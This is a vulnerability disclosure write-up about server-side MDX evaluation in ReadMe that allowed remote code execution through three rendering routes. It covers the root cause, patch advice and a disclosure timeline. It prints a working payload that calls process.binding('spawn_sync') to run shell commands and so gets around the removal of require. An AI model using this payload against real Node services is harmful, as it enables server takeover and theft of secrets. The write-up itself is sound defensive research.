---
layout: default
title: "One Root Cause, Three RCE Sinks"
---
## One Root Cause, Three RCE Sinks: Auditing ReadMe's Server-Side MDX Pipeline

*How an arithmetic probe uncovered three independently reachable server-side RCE sinks sharing one root cause.*

*Note: The vulnerable behavior described in this article has since been remediated by the vendor. The discussion focuses on the investigation methodology, root cause analysis, and lessons learned.*

**Reading time: 12 minutes**

**Date:** June 2026  
**Severity:** Critical · CVSS 3.1: 9.9 `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`  
**CWE:** CWE-94 (Code Injection) → CWE-78 (OS Command Injection)

---

### Introduction

While investigating ReadMe's documentation rendering pipeline, I discovered that several independent rendering surfaces evaluated MDX expressions server-side. The first finding looked like a single endpoint issue. It was not. A broader review of the architecture revealed multiple independently reachable sinks, all behaving consistently with a shared server-side evaluation pipeline running in an unsandboxed Node.js context.

This article walks through the investigation: how an arithmetic probe confirmed server-side evaluation, how the Node scope was mapped, why `process` survived when `require` did not, and how the root cause turned out to be a shared evaluation pipeline rather than a single vulnerable route. The goal is not to document one bug, but to show how to reason about server-side rendering pipelines when looking for expression-evaluation vulnerabilities.

---

### Background: MDX and Server-Side Rendering

MDX is Markdown with embedded JSX and JavaScript expressions. The syntax `{ ... }` denotes a JavaScript expression that the renderer evaluates and interpolates into the output. This is the feature that makes MDX powerful. It is also what makes it dangerous when evaluation happens in the wrong context.

In a purely client-side setup, expression evaluation runs in the browser. An author writing `{7*7}` sees `49` rendered, and the evaluation happens in their own page context. The risk surface is the reader's browser, and the same-origin model applies.

Server-side rendering changes the threat model entirely. When a server compiles MDX and evaluates expressions before sending HTML to the browser, the expressions run in the server's runtime. A JavaScript expression evaluated on the server can potentially have access to server-side objects such as `process`, `require`, `global`, and anything the Node process can reach. If the evaluation scope is not sandboxed, an author who can store MDX content can execute code on the server.

The question is never whether MDX *can* evaluate expressions. It can. The question is *where* that evaluation happens, and what the sandbox looks like. ReadMe's public documentation describes authoring content using MDX, but does not indicate that expressions are evaluated server-side. The observed behavior told a different story.

---

### Understanding the Rendering Pipeline

Based on the observed behavior, the rendering pipeline appeared to follow a structure similar to the following:

```text
+---------------------+
|       Content       |
| (MDX stored in docs,|
| custom blocks,      |
| custom pages)       |
+----------+----------+
           |
           v
+---------------------+
|       Storage       |
| (stored MDX/docs)   |
+----------+----------+
           |
           v
+---------------------+
|    Render Route     |
| GET /docs/{slug}    |
| POST /custom_blocks |
| GET /page/{slug}    |
+----------+----------+
           |
           v
+---------------------+
|      SSR Layer      |
| (MDX compilation &  |
| server-side render) |
+----------+----------+
           |
           v
+---------------------+
| Expression Eval     |
| (server-side JS)    |
+----------+----------+
           |
           v
+---------------------+
|    HTML Output      |
| (returned to client)|
+---------------------+
```

---

Three things matter here.

First, the render routes are thin. They read stored content, hand it to the SSR layer, and return the result. They do not enforce per-route expression policies.

Second, the SSR layer is shared. Every render route, regardless of content type, funnels through the same MDX compilation and expression evaluation. This architectural design exposed the same underlying flaw through multiple independently reachable routes.

Third, expression evaluation happens on the server, before any HTML reaches the browser. A reader visiting a page never executes MDX expressions themselves. The server already did it.

This last point is what makes the finding server-side RCE rather than DOM XSS. The browser is irrelevant. The Node process evaluating the expression is the target.

---

### Initial Discovery

The investigation started with a single endpoint: the custom block render route. This route accepts a `source` field containing MDX and returns rendered HTML. It is used by ReadMe's editor to preview content.

The first probe was arithmetic. If `{ ... }` is evaluated server-side, then `{7*7}` should produce `49` in the response. If evaluation is client-side or disabled, the literal text `{7*7}` should pass through unchanged.

**Probe**
```http
POST /<tenant>/.../custom_blocks/new/render HTTP/1.1
Host: <tenant>.readme.io
Cookie: <authenticated session>
Content-Type: application/json

{"type":"component","name":"new","source":"zz{7*7}zz"}
```

**Response (excerpt)**
```json
{"data":{"...":"<p>zz49zz</p>"}}
```

The response contained `49`. The expression was evaluated before the response was generated. That confirmed server-side evaluation on this route.

At this point, the finding was a server-side JavaScript injection. An authenticated editor could evaluate arbitrary JavaScript expressions on the server. The next question was what the execution scope actually contained.

---

### Investigation Methodology

Rather than treating the initial finding as an isolated endpoint issue, I assumed the renderer itself might be shared across multiple content types. Instead of fuzzing additional endpoints blindly, I mapped the application's content model and identified every feature that accepted Markdown or MDX before passing it through the rendering pipeline. Each candidate surface was then validated with the same arithmetic probe before attempting further escalation.

This matters because the first sink you find is rarely the only sink. The instinct to stop after one confirmed vulnerability is the instinct that leaves architectural bugs in place. The instinct to ask "what else shares this code path" is the instinct that finds them.

---

### Escalating to RCE

Knowing that expressions execute on the server, the next step was mapping the scope. A JavaScript expression in Node can be harmless if the scope is locked down, or catastrophic if it exposes the wrong objects. The probes were simple `typeof` checks.

**Scope probe**
```
{(() => {
  return 'proc=' + typeof process +
         ' req='  + typeof require +
         ' mod='  + typeof module +
         ' fn='   + typeof Function +
         ' fetch=' + typeof fetch;
})()}
```

**Result**
```
proc=object req=undefined mod=undefined fn=function fetch=function
```

This told a clear story.

`require` and `module` were `undefined`. The execution scope exposed `process` while `require` and `module` were unavailable. This is a common and reasonable hardening outcome. It stops the trivial `require('child_process')` payload.

`process` was `object`. It was present while `require` and `module` were not. `process` is a global in Node, but it is not the same kind of global as `require`. It is attached to `globalThis` and survives scope filtering that targets module-system objects. Leaving `process` in scope is a serious gap, because `process.binding` exposes internal native bindings that can provide capabilities beyond what is intended for application code.

`Function` was `function`. The `Function` constructor was reachable, which means arbitrary code could be compiled and run even if other paths were closed.

`fetch` was `function`. Outbound network access was available from the scope.

The critical chain was `process` → `process.binding` → `spawn_sync`. `process.binding` is the legacy internal API that Node modules use to reach native code. It is deprecated and hidden behind `--no-deprecation` in most contexts, but it is still present in production Node builds. `process.binding('spawn_sync')` returns the internal binding used by `child_process.spawnSync`. Calling it directly bypasses the `child_process` module entirely.

**Command execution probe**
```
{process.binding('spawn_sync').spawn({
  file: '/bin/sh',
  args: ['/bin/sh', '-c', 'whoami'],
  envPairs: Object.keys(process.env).map(k => k + '=' + process.env[k]),
  stdio: [
    { type: 'pipe', readable: true, writable: false },
    { type: 'pipe', readable: false, writable: true },
    { type: 'pipe', readable: false, writable: true }
  ]
}).output.join('|')}
```

**Result**
```
<service-account>
```

`whoami` returned `<service-account>`. The Node process was running as the `<service-account>` user. Arbitrary OS command execution was confirmed.

The reason `spawn_sync` worked is that `process.binding` hands back a native binding object with a `spawn` method. That method does the same work as `child_process.spawnSync`, but it is not gated by the module system. Stripping `require` does not strip `process.binding`. The lockdown was incomplete because it targeted the wrong surface.

---

### Finding Additional Sinks

```text
                 +----------------------+
                 |   Shared SSR Layer   |
                 |  MDX Compilation &   |
                 | Expression Evaluation|
                 +----------+-----------+
                            ^
                            |
        +-------------------+-------------------+
        |                   |                   |
        |                   |                   |
+---------------+   +---------------+   +---------------+
| Docs Guides   |   | Custom Blocks |   | Custom Pages  |
| GET /docs/*   |   | POST /render  |   | GET /page/*   |
+---------------+   +---------------+   +---------------+
```

---

Three content types fit the model:

- **Docs guides** — the primary documentation content type, served at `GET /docs/{slug}`. The body is stored as documentation content.
- **Custom blocks** — reusable MDX components, rendered via `POST /custom_blocks/{name}/render`. The source is stored as MDX content.
- **Custom pages** — standalone pages served at `GET /page/{slug}`. The body is stored as page content.

Each was tested with the same arithmetic probe. Each returned `49`. Each was then tested with the `whoami` payload. Each returned `<service-account>`.

These were not duplicate bugs. They were independent routes with independent storage, each reaching the same shared evaluator. Addressing only a single rendering surface would leave the remaining routes unaffected if they continued to share the same evaluation behavior. The architecture, not any single route, was the vulnerability.

This is the methodological takeaway. When a rendering sink is found, the right move is to audit every surface that shares the render path, not to file the first finding and stop. Shared rendering code creates shared vulnerabilities. The bug lives in the shared layer, and every route through that layer is a sink.

---

### Root Cause

```text
+---------------------------------------------------------------+
|               Shared MDX Evaluation Layer                     |
|                                                               |
|  Server-side expression evaluation without                   |
|  an effective sandbox  <---------- Root Cause                 |
|                                                               |
|   +-------------+  +-------------+  +-------------+           |
|   | Docs        |  | Custom      |  | Custom      |           |
|   | Renderer    |  | Blocks      |  | Pages       |           |
|   |             |  | Renderer    |  | Renderer    |           |
|   +-------------+  +-------------+  +-------------+           |
+---------------------------------------------------------------+
```

---

This is a common architectural pattern, and a common failure mode. A rendering service centralizes its MDX handling to avoid duplication. That centralization is good engineering. But if the centralized behavior is unsafe, every consumer inherits the risk. The fix is not to patch routes. The fix is to fix the evaluation behavior at the shared layer.

---

### Why This Became RCE

The escalation from expression evaluation to RCE depended on three things being true at once.

**`process` was in scope.** `require` and `module` were unavailable, but `process` was present. This is the gap that made everything else possible. `process` is a Node global attached to `globalThis`. Scope filtering that targets module-system objects does not necessarily remove it.

**`process.binding` was reachable.** `process.binding` is the internal API that Node's own modules use to access native code. It is deprecated and discouraged, but it is present in production Node. It is not removed by filtering `require`, because it is not accessed through the module system. `process.binding('spawn_sync')` returns the native binding behind `child_process.spawnSync`.

**No string or keyword filter was applied.** The payload contained literal strings like `spawn_sync`, `/bin/sh`, and `whoami`. None were blocked. A keyword-based filter might have detected these strings. The absence of any filter meant the trivial payload worked directly.

These three conditions compound. Removing any one of them would have stopped the trivial exploit. `process` out of scope closes the binding path. `process.binding` removed closes the native spawn path. A keyword filter on `spawn_sync` forces the attacker into obfuscation, which is harder but not impossible. The defense in depth was absent. One gap was enough.

---

### Patch Recommendations

The fix belongs at the shared layer, not at individual routes.

**Disable server-side expression evaluation.** If expressions do not need to run on the server, the safest option is to not evaluate them there. If server-side evaluation is unnecessary, treating `{ ... }` as literal text eliminates the attack surface entirely.

**Sandbox evaluation if it must run.** If server-side evaluation is a product requirement, it must run in a hardened JavaScript sandbox. `isolated-vm` provides a separate V8 isolate with its own heap and no access to the host process. At minimum, the sandbox must remove `process`, `global`, `globalThis`, `Function`, `fetch`, and `process.binding` from the evaluation scope. The sandbox must be applied at the shared evaluation layer so every route inherits it.

**Remove dangerous globals from the scope.** If a sandbox is not feasible, at minimum strip `process` and `process.binding` from the evaluation scope. Stripping `require` alone is insufficient. `process.binding` is the bypass path.

**Do not rely on keyword filters.** String matching on `spawn_sync` or `child_process` is easily defeated with `String.fromCharCode` or property access via array notation. Filters are a speed bump, not a barrier.

**Audit shared rendering paths.** The lesson from this investigation generalizes. Any shared rendering layer is a single point of failure for every route that uses it. When a rendering sink is found, audit every surface that shares the path. One sink is rarely the only sink.

---

### Lessons Learned

**One rendering sink is rarely the only rendering sink.** The first finding was custom blocks. The architecture said there would be more. Docs guides and custom pages were found by reasoning about the render path, not by fuzzing endpoints.

**Architecture matters more than endpoints.** Addressing `custom_blocks/render` alone would have closed one route. The shared evaluator would still have been vulnerable. The fix has to target the shared layer, because the shared layer is where the evaluation behavior lives.

**Shared rendering code creates shared vulnerabilities.** Centralization is good engineering until the centralized configuration is unsafe. Then every consumer inherits the risk at once.

**Understanding execution flow is more valuable than fuzzing.** The additional sinks were found by asking "what else goes through this code path," not by throwing payloads at every URL. Knowing how a request reaches the evaluator is the skill that finds the second and third sinks.

**MDX is powerful but dangerous when evaluated server-side.** The feature that makes MDX useful, expression evaluation, is the feature that makes it an RCE vector on the server. Server-side MDX evaluation needs a sandbox by default, not as an opt-in.

---

### Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-06-13 | Reported sink #1 (custom_blocks render endpoint) |
| 2026-06-14 | Reported sink #2 (docs/{slug}) and sink #3 (custom_pages /page/{slug}) |
| 2026-06-16 | Vendor acknowledged submissions |
| 2026-06-29 | Vendor confirmed all three shared a previously reported root cause |

---

### References

- [ReadMe MDX documentation](https://docs.readme.com/main/docs/mdx)
- [ReadMe Custom Pages API](https://docs.readme.com/main/reference/getcustompages)
- [CWE-94 — Code Injection](https://cwe.mitre.org/data/definitions/94.html)
- [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [MDX specification](https://mdxjs.com/)
- [Node.js process.binding deprecation](https://nodejs.org/api/deprecations.html#DEP0111)
- [Node.js child_process documentation](https://nodejs.org/api/child_process.html)
- [isolated-vm on GitHub](https://github.com/laverdet/isolated-vm)

---

*Found by: [Ivan Ivančič](index.html)*
